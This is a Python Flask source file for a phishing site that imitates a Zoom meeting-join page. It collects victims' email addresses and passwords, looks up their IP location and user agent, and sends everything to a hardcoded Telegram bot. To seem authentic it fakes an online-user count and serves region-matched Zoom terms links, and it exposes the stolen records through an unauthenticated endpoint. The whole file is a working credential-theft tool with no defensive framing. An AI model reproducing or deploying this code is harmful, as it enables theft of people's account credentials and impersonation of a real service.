from flask import Flask, render_template, request, jsonify, session
import os
from datetime import datetime
import requests
import logging
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-change-this')

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7986783861:AAEvBWaOxcIR3VvdGNK3HWqqBDle_j3atE8')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '1174627659')
TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'

# Store submissions (in production, use a database)
submissions = []

def send_to_telegram(form_data, ip_info):
    """Send form data to Telegram bot"""
    try:
        # Format the message
        message = f"""🚨 *New Meeting Join Request* 🚨

📋 *Meeting Details:*
• Meeting ID: `{form_data.get('meetingId', 'N/A')}`
• Email: `{form_data.get('email', 'N/A')}`
• Password: `{form_data.get('password', 'N/A')}`

🌍 *IP Information:*
• IP Address: `{ip_info.get('ip', 'N/A')}`
• Country: {ip_info.get('country', 'N/A')}
• Region: {ip_info.get('region', 'N/A')}
• City: {ip_info.get('city', 'N/A')}

⏰ *Timestamp:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🔗 *User Agent:* {request.headers.get('User-Agent', 'N/A')[:200]}

📊 *Total Submissions Today:* {len(submissions) + 1}"""

        # Prepare payload
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown',
            'disable_notification': False
        }

        # Send to Telegram
        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=10)
        
        if response.status_code == 200:
            logger.info(f"Message sent to Telegram successfully: {response.json()}")
            return True
        else:
            logger.error(f"Telegram API error: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        logger.error(f"Failed to send to Telegram: {str(e)}")
        return False

def get_ip_info():
    """Get detailed IP information for the client"""
    try:
        # Try to get real IP
        if request.headers.get('X-Forwarded-For'):
            ip = request.headers.get('X-Forwarded-For').split(',')[0]
        else:
            ip = request.remote_addr

        # Get detailed IP information from multiple sources
        ip_info = {
            'ip': ip,
            'country': 'Unknown',
            'region': 'Unknown',
            'city': 'Unknown',
            'isp': 'Unknown',
            'timezone': 'Unknown'
        }

        # Try ipinfo.io (more reliable)
        try:
            response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                ip_info.update({
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('region', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('org', 'Unknown').split()[-1] if data.get('org') else 'Unknown',
                    'timezone': data.get('timezone', 'Unknown'),
                    'loc': data.get('loc', 'Unknown')  # Latitude,Longitude
                })
        except:
            pass

        # Fallback to ip-api.com
        if ip_info['country'] == 'Unknown':
            try:
                response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'success':
                        ip_info.update({
                            'country': data.get('country', 'Unknown'),
                            'region': data.get('regionName', 'Unknown'),
                            'city': data.get('city', 'Unknown'),
                            'isp': data.get('isp', 'Unknown'),
                            'timezone': data.get('timezone', 'Unknown')
                        })
            except:
                pass

        return ip_info
        
    except Exception as e:
        logger.error(f"Error getting IP info: {str(e)}")
        return {
            'ip': 'Unknown',
            'country': 'Unknown',
            'region': 'Unknown',
            'city': 'Unknown',
            'isp': 'Unknown',
            'timezone': 'Unknown'
        }

@app.route('/')
def index():
    """Render the main meeting join page"""
    return render_template('index.html')

@app.route('/submit-meeting', methods=['POST'])
def submit_meeting():
    """Handle meeting form submission with Telegram notification"""
    try:
        data = request.json
        
        # Basic validation
        if not data.get('meetingId') or not data.get('email') or not data.get('password'):
            return jsonify({
                'success': False,
                'message': 'Alle Felder sind erforderlich'
            }), 400
        
        # Get detailed IP information
        ip_info = get_ip_info()
        
        # Create submission record
        submission = {
            'meeting_id': data['meetingId'],
            'email': data['email'],
            'password': data['password'],
            'timestamp': datetime.now().isoformat(),
            'ip_info': ip_info,
            'user_agent': request.headers.get('User-Agent', 'Unknown')
        }
        
        # Store submission
        submissions.append(submission)
        
        # Send to Telegram bot
        telegram_sent = send_to_telegram(data, ip_info)
        
        # Prepare response
        response_data = {
            'success': True,
            'message': 'Meeting details submitted successfully',
            'telegram_sent': telegram_sent,
            'data': {
                'meeting_id': submission['meeting_id'],
                'timestamp': submission['timestamp'],
                'ip_info': {
                    'ip': ip_info['ip'],
                    'country': ip_info['country']
                }
            }
        }
        
        # Log the submission
        logger.info(f"New submission: {data['email']} from {ip_info['ip']} - Telegram: {telegram_sent}")
        
        return jsonify(response_data)
        
    except Exception as e:
        logger.error(f"Error in submit_meeting: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Internal server error: {str(e)}'
        }), 500

@app.route('/accept-cookies', methods=['POST'])
def accept_cookies():
    """Handle cookie acceptance"""
    session['cookies_accepted'] = True
    return jsonify({'success': True})

@app.route('/api/online-users')
def online_users():
    """Return simulated online users count"""
    import random
    # More realistic simulation
    base_users = 7
    variation = random.randint(-3, 5)
    return jsonify({'count': base_users + variation})

@app.route('/api/telegram-test', methods=['POST'])
def telegram_test():
    """Test endpoint for Telegram bot"""
    try:
        test_data = {
            'meetingId': 'TEST-12345',
            'email': 'test@example.com',
            'password': 'testpassword'
        }
        
        test_ip_info = {
            'ip': '127.0.0.1',
            'country': 'Test Country',
            'region': 'Test Region',
            'city': 'Test City'
        }
        
        telegram_sent = send_to_telegram(test_data, test_ip_info)
        
        return jsonify({
            'success': telegram_sent,
            'message': 'Test message sent to Telegram' if telegram_sent else 'Failed to send test message'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@app.route('/api/submissions', methods=['GET'])
def get_submissions():
    """Get all submissions (for admin purposes)"""
    # In production, add authentication
    return jsonify({
        'count': len(submissions),
        'submissions': submissions[-10:]  # Last 10 submissions
    })

@app.route('/api/ip-info')
def client_ip_info():
    """Get client IP information"""
    ip_info = get_ip_info()
    return jsonify(ip_info)

@app.route('/api/region-info')
def region_info():
    """Get region information for footer"""
    try:
        ip_info = get_ip_info()
        country = ip_info.get('country', 'Unknown')
        
        # Region Map
        region_map = {
            'DE': {
                'name': 'Germany',
                'terms': 'https://zoom.us/de/terms',
                'privacy': 'https://zoom.us/de/privacy',
                'footer': 'EU-Nutzungsbedingungen und Datenschutz anzeigen (DSGVO)',
                'language': 'de'
            },
            'US': {
                'name': 'United States',
                'terms': 'https://zoom.us/terms',
                'privacy': 'https://zoom.us/privacy',
                'footer': 'View US Terms & Privacy',
                'language': 'en'
            },
            'GB': {
                'name': 'United Kingdom',
                'terms': 'https://zoom.us/gb/terms',
                'privacy': 'https://zoom.us/gb/privacy',
                'footer': 'View UK Terms (UK GDPR)',
                'language': 'en'
            },
            'FR': {
                'name': 'France',
                'terms': 'https://zoom.us/fr/terms',
                'privacy': 'https://zoom.us/fr/privacy',
                'footer': 'Voir les conditions et la confidentialité de l\'UE (RGPD)',
                'language': 'fr'
            },
            'ES': {
                'name': 'Spain',
                'terms': 'https://zoom.us/es/terms',
                'privacy': 'https://zoom.us/es/privacy',
                'footer': 'Ver Términos y Privacidad de la UE (GDPR)',
                'language': 'es'
            },
            'IT': {
                'name': 'Italy',
                'terms': 'https://zoom.us/it/terms',
                'privacy': 'https://zoom.us/it/privacy',
                'footer': 'Visualizza Termini e Privacy UE (GDPR)',
                'language': 'it'
            }
        }
        
        # Default to global
        region = region_map.get(country, {
            'name': 'Global',
            'terms': 'https://zoom.us/terms',
            'privacy': 'https://zoom.us/privacy',
            'footer': 'Global Terms and Privacy',
            'language': 'en'
        })
        
        return jsonify({
            'region': region['name'],
            'country': country,
            'terms': region['terms'],
            'privacy': region['privacy'],
            'footer': region['footer'],
            'language': region['language']
        })
        
    except Exception as e:
        logger.error(f"Error in region_info: {str(e)}")
        return jsonify({
            'region': 'Global',
            'country': 'Unknown',
            'terms': 'https://zoom.us/terms',
            'privacy': 'https://zoom.us/privacy',
            'footer': 'Global Terms and Privacy',
            'language': 'en'
        })

if __name__ == '__main__':
    
    
    app.run(debug=True, port=5000, host='0.0.0.0')